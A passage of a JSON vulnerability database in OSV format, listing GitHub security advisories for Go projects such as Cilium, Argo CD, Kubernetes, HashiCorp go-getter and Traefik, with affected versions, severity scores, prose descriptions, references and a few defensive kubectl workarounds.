"ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "0.29.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/kustomize-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "0.23.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/helm-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.2.0"}, {"fixed": "0.19.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-vvmq-fwmg-2gjc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24817"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/flux2"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-05-16T18:13:51Z", "nvd_published_at": "2022-05-06T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6p8v-8cq8-v2r3", "modified": "2022-05-24T21:14:41Z", "published": "2022-05-24T21:14:41Z", "aliases": ["CVE-2022-29178"], "summary": "Access to Unix domain socket can lead to privileges escalation in Cilium", "details": "### Impact\n\nUsers with host file system access on a node and the privileges to run as group ID 1000 can gain access to the per node API of Cilium via Unix domain socket on the host where Cilium is running. If a malicious user is able to gain unprivileged access to a user corresponding to this group, then they can leverage this access to compromise the integrity as well as system availability on that host. Operating Systems that have unprivileged users **not** belonging the group ID 1000 are **not** affected by this vulnerability.\n\nBest practices for managing the secure deployment of Kubernetes clusters will typically limit the ability for a malicious user to deploy pods with access to this group or to access the host filesystem, and limit user access to the nodes for users belonging to this group. These best practices include (but are not limited to) enforcing Admission Control policies to limit the configuration of Kubernetes Pod [hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath) and [SecurityContext](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) fields.\n\n### Patches\n\nCilium versions >=1.9.16, >=1.10.11, >=1.11.5 mitigate this issue by setting the default group to 0 (root).\n\n### Workarounds\n\nPrevent Cilium from running with group 1000 by modifying Cilium's DaemonSet to run with the following command:\n\n```yaml\n      containers:\n      - name: cilium-agent\n        args:\n        - -c\n        - \"groupdel cilium && cilium-agent --config-dir=/tmp/cilium/config-map\"\n        command:\n        - bash\n```\ninstead of\n```yaml\n      containers:\n      - name: cilium-agent\n        args:\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n```\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent and Form 3 to prepare these mitigations.  Special thanks to Daniel Iziourov and Daniel Teixeira for their cooperation.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@cilium.io](mailto:security@cilium.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.16"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-6p8v-8cq8-v2r3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29178"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.10.11"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.5"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.9.16"}, {"type": "PACKAGE", "url": "github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-24T21:14:41Z", "nvd_published_at": "2022-05-20T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2h9c-34v6-3qmr", "modified": "2023-12-07T21:16:21Z", "published": "2022-05-13T01:09:54Z", "aliases": ["CVE-2015-7561"], "summary": "Kubernetes in OpenShift3 Access Control Misconfiguration", "details": "Kubernetes in OpenShift3 allows remote authenticated users to use the private images of other users should they know the name of said image.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0-alpha.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7561"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/18909"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/e185b1028ac8459f7b451e1115399192e96f6ee9"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1291963"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-07-31T23:55:42Z", "nvd_published_at": "2017-08-07T17:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fp37-c92q-4pwq", "modified": "2023-09-25T19:56:20Z", "published": "2022-05-24T16:55:06Z", "aliases": ["CVE-2019-11247"], "summary": "Kubernetes kube-apiserver unauthorized access", "details": "The Kubernetes kube-apiserver mistakenly allows access to a cluster-scoped custom resource if the request is made as if the resource were namespaced. Authorizations for the resource accessed in this manner are enforced using roles and role bindings within the namespace, meaning that a user with access only to a resource in one namespace could create, view update or delete the cluster-scoped resource (according to their namespace role privileges). Kubernetes affected versions include versions prior to 1.13.9, versions prior to 1.14.5, versions prior to 1.15.2, and versions 1.7, 1.8, 1.9, 1.10, 1.11, 1.12.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/apiextensions-apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.7.0"}, {"fixed": "0.13.9"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/apiextensions-apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.14.0"}, {"fixed": "0.14.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/apiextensions-apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0"}, {"fixed": "0.15.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11247"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/80983"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/80750"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/80850"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/80851"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/80852"}, {"type": "WEB", "url": "https://github.com/kubernetes/apiextensions-apiserver/commit/b9b7d2b3f32f8edbeb47b8726710eeb868bce196"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:2816"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:2824"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2690"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2769"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/apiextensions-apiserver"}, {"type": "WEB", "url": "https://groups.google.com/d/msg/kubernetes-security-announce/vUtEcSEY6SM/v2ZZxsmtFQAJ"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190919-0003/"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-17T23:39:36Z", "nvd_published_at": "2019-08-29T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x24g-9w7v-vprh", "modified": "2022-08-11T19:31:17Z", "published": "2022-05-26T00:01:27Z", "aliases": ["CVE-2022-26945"], "summary": "HashiCorp go-getter command injection", "details": "HashiCorp go-getter before 2.0.2 allows Command Injection.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/s3/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/gcs/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-26945"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/359"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/361"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/38e97387488f5439616be60874979433a12edb48"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/a2ebce998f8d4105bd4b78d6c99a12803ad97a45"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/39930"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0586"}], "database_specific": {"cwe_ids": ["CWE-77"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:20:55Z", "nvd_published_at": "2022-05-25T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qcvw-82hh-gq38", "modified": "2023-07-17T21:05:13Z", "published": "2022-05-24T16:53:16Z", "aliases": ["CVE-2019-14993"], "summary": "Istio ReDoS Vulnerability", "details": "Istio before 1.1.13 and 1.2.x before 1.2.4 mishandles regular expressions for long URIs, leading to a denial of service during use of the JWT, VirtualService, HTTPAPISpecBinding, or QuotaSpecBinding API.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.13"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14993"}, {"type": "WEB", "url": "https://github.com/envoyproxy/envoy/issues/7728"}, {"type": "WEB", "url": "https://discuss.istio.io/t/upcoming-security-updates-in-istio-1-2-4-and-1-1-13/3383"}, {"type": "WEB", "url": "https://gcc.gnu.org/bugzilla/show_bug.cgi?id=86164"}, {"type": "WEB", "url": "https://istio.io/blog/2019/istio-security-003-004/"}], "database_specific": {"cwe_ids": ["CWE-185"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-17T21:05:13Z", "nvd_published_at": "2019-08-13T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r3fq-cmmw-cpmm", "modified": "2023-08-24T13:02:38Z", "published": "2022-05-24T16:46:50Z", "aliases": ["CVE-2019-12452"], "summary": "Containous Traefik Exposes Password Hashes", "details": "types/types.go in Containous Traefik 1.7.x through 1.7.11, when the `--api` flag is used and the API is publicly reachable and exposed without sufficient access control (which is contrary to the API documentation), allows remote authenticated users to discover password hashes by reading the Basic HTTP Authentication or Digest HTTP Authentication section, or discover a key by reading the ClientTLS section. These can be found in the JSON response to a `/api` request.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.12"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.7.11"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12452"}, {"type": "WEB", "url": "https://github.com/containous/traefik/issues/4917"}, {"type": "WEB", "url": "https://github.com/containous/traefik/pull/4918"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/commit/a169fec2e08e391d24b509c00fcf011656c1395c"}, {"type": "PACKAGE", "url": "https://github.com/containous/traefik"}], "database_specific": {"cwe_ids": ["CWE-522"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-14T19:46:49Z", "nvd_published_at": "2019-05-29T19:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r642-gv9p-2wjj", "modified": "2022-05-24T20:47:34Z", "published": "2022-05-24T20:47:34Z", "aliases": ["CVE-2022-29165"], "summary": "Argo CD will blindly trust JWT claims if anonymous access is enabled", "details": "### Impact\n\nA critical vulnerability has been discovered in Argo CD which would allow unauthenticated users to impersonate as any Argo CD user or role, including the `admin` user, by sending a specifically crafted JSON Web Token (JWT) along with the request. In order for this vulnerability to be exploited, [anonymous access](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#anonymous-access) to the Argo CD instance must have been enabled. \n\nIn a default Argo CD installation, anonymous access is disabled. To find out if anonymous access is enabled in your instance, please see the *Workarounds* section of this advisory below.\n\nThe vulnerability can be exploited to impersonate as any user or role, including the built-in `admin` account regardless of whether that account is enabled or disabled. Also, the attacker does not need an account on the Argo CD instance in order to exploit this.\n\nIf anonymous access to the instance is enabled, an attacker can:\n\n* Escalate their privileges, effectively allowing them to gain the same privileges on the cluster as the Argo CD instance, which is cluster admin in a default installation. This will allow the attacker to create, manipulate and delete any resource on the cluster.\n\n* Exfiltrate data by deploying malicious workloads with elevated privileges, thus bypassing any redaction of sensitive data otherwise enforced by the Argo CD API\n\nWe **strongly recommend** that all users of Argo CD update to a version containing this patch as soon as possible, regardless of whether or not anonymous access is enabled in your instance.\n\nPlease see below for a list of versions containing a fix for this vulnerability and any possible workarounds existing for this issue.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.4\n* v2.2.9\n* v2.1.15\n\n### Workarounds\n\n#### Disable anonymous access\n\nIf you are not able to upgrade to a patched version quickly, we highly suggest disabling anonymous access if it is enabled. \n\nTo find out whether anonymous access is enabled for your Argo CD instance, you can query the `argocd-cm` ConfigMap in the Argo CD's installation namespace. The below example assumes you have installed Argo CD to the `argocd` namespace:\n\n```shell\n$ kubectl get -n argocd cm argocd-cm -o jsonpath='{.data.users\\.anonymous\\.enabled}'\n```\n\nIf the result of this command is either empty or `\"false\"`, anonymous access to that instance is not enabled. If the result is `\"true\"`, your instance is vulnerable.\n\nTo disable anonymous access, patch the `argocd-cm` ConfigMap to either remove the `users.anonymous.enabled` field or set this field to `\"false\"`. \n\nTo set the field to `\"false\"`:\n\n```shell\n$ kubectl patch -n argocd cm argocd-cm --type=json -p='[{\"op\":\"add\", \"path\":\"/data/users.anonymous.enabled\", \"value\":\"false\"}]'\n```\nOr you can remove the field completely, thus disabling anonymous access because the default is `false`:\n\n```shell\n$ kubectl patch -n argocd cm argocd-cm --type=json -p='[{\"op\":\"remove\", \"path\":\"/data/users.anonymous.enabled\"}]'\n```\n\n### Credits\n\nThe Argo CD team would like to thank Mark Pim and Andrzej Hajto, who discovered this vulnerability and reported it in a responsible way to us.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.15"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-r642-gv9p-2wjj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29165"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.1.15"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.2.9"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.4"}, {"type": "PACKAGE", "url": "github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-287", "CWE-290"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-05-24T20:47:34Z", "nvd_published_at": "2022-05-20T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6452-jr93-r5qm", "modified": "2023-08-25T21:47:54Z", "published": "2022-05-24T16:50:40Z", "aliases": ["CVE-2019-13915"], "summary": "b3log Wide unauthenticated file access", "details": "b3log Wide before 1.6.0 allows three types of attacks to access arbitrary files. First, the attacker can write code in the editor, and compile and run it approximately three times to read an arbitrary file. Second, the attacker can create a symlink, and then place the symlink into a ZIP archive. An unzip operation leads to read access, and write access (depending on file permissions), to the symlink target. Third, the attacker can import a Git repository that contains a symlink, similarly leading to read and write access.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/b3log/wide"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-13915"}, {"type": "WEB", "url": "https://github.com/b3log/wide/issues/355"}, {"type": "PACKAGE", "url": "https://github.com/b3log/wide"}, {"type": "WEB", "url": "https://sca.analysiscenter.veracode.com/vulnerability-database/security/arbitrary-file-reads-and-writes/go/sid-20862"}, {"type": "WEB", "url": "https://web.archive.org/web/20190522035724/https://github.com/b3log/wide"}], "database_specific": {"cwe_ids": ["CWE-59", "CWE-74"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-14T21:08:41Z", "nvd_published_at": "2019-07-18T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-27mh-3343-6hg5", "modified": "2023-07-12T20:40:16Z", "published": "2022-05-24T17:37:27Z", "aliases": ["CVE-2020-29244"], "summary": "dhowden tag panic due to out-of-bounds read", "details": "Due to improper bounds checking, a number of methods in dhowden tag before 0.0.0-20201120070457-d52dcb253c63 can trigger a panic due to attempted out-of-bounds reads. If the package is used to parse user supplied input, this may be used as a vector for a denial of service attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dhowden/tag"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201120070457-d52dcb253c63"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29244"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/79"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/4b595ed4fac79f467594aa92f8953f90f817116e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/6b18201aa5c5535511802ddfb4e4117686b4866d"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/a92213460e4838490ce3066ef11dc823cdc1740e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/d52dcb253c63a153632bfee5f269dd411dcd8e96"}, {"type": "PACKAGE", "url": "https://github.com/dhowden/tag"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0097"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:40:44Z", "nvd_published_at": "2020-12-28T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cjr4-fv6c-f3mv", "modified": "2022-11-21T19:45:28Z", "published": "2022-05-26T00:01:27Z", "aliases": ["CVE-2022-30322"], "summary": "HashiCorp go-getter unsafe downloads could lead to arbitrary host access", "details": "HashiCorp go-getter through 2.0.2 does not safely perform downloads. Arbitrary host access was possible via go-getter path traversal, symlink processing, and command injection flaws.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/s3/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/gcs/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30322"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/359"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/361"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/38e97387488f5439616be60874979433a12edb48"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/a2ebce998f8d4105bd4b78d6c99a12803ad97a45"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/39930"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/releases"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0586"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:19:25Z", "nvd_published_at": "2022-05-25T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w3x4-9854-95x8", "modified": "2023-10-06T21:14:52Z", "published": "2022-05-13T01:02:31Z", "aliases": ["CVE-2017-7297"], "summary": "Rancher Access Control Vulnerability", "details": "Rancher Labs rancher server 1.2.0+ is vulnerable to authenticated users disabling access control via an API call. This is fixed in versions rancher/server:v1.2.4, rancher/server:v1.3.5, rancher/server:v1.4.3, and rancher/server:v1.5.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-7297"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/issues/8296"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://web.archive.org/web/20200227181556/http://www.securityfocus.com/bid/97180"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-25T21:57:14Z", "nvd_published_at": "2017-03-29T00:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-px5r-fqj6-r2f8", "modified": "2023-10-06T16:24:06Z", "published": "2022-05-14T02:01:21Z", "aliases": ["CVE-2018-17031"], "summary": "Gogs XSS Vulnerability", "details": "In Gogs 0.11.53, an attacker can use a crafted .eml file to trigger MIME type sniffing, which leads to XSS, as demonstrated by Internet Explorer, because an \"X-Content-Type-Options: nosniff\" header is not sent.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.11.53"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17031"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/5397"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/6008"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-25T20:11:37Z", "nvd_published_at": "2018-09-14T02:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3vm4-22fp-5rfm", "modified": "2023-07-12T20:45:53Z", "published": "2022-05-24T22:01:25Z", "aliases": ["CVE-2020-29652"], "summary": "golang.org/x/crypto/ssh NULL Pointer Dereference vulnerability", "details": "A nil pointer dereference in the golang.org/x/crypto/ssh component through v0.0.0-20201203163018-be400aefbc4c for Go allows remote attackers to cause a denial of service against SSH servers. An attacker can craft an authentication request message for the `gssapi-with-mic` method which will cause NewServerConn to panic via a nil pointer dereference if ServerConfig.GSSAPIWithMICConfig is nil.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201216223049-8b5274cf687f"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29652"}, {"type": "WEB", "url": "https://go-review.googlesource.com/c/crypto/+/278852"}, {"type": "WEB", "url": "https://go.dev/cl/278852"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/8b5274cf687fd9316b4108863654cc57385531e8"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/ouZIlBimOsE?pli=1"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r68032132c0399c29d6cdc7bd44918535da54060a10a12b1591328bff@%3Cnotifications.skywalking.apache.org%3E"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0227"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:29:05Z", "nvd_published_at": "2020-12-17T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jmrx-5g74-6v2f", "modified": "2023-02-08T00:35:06Z", "published": "2022-05-24T16:55:06Z", "aliases": 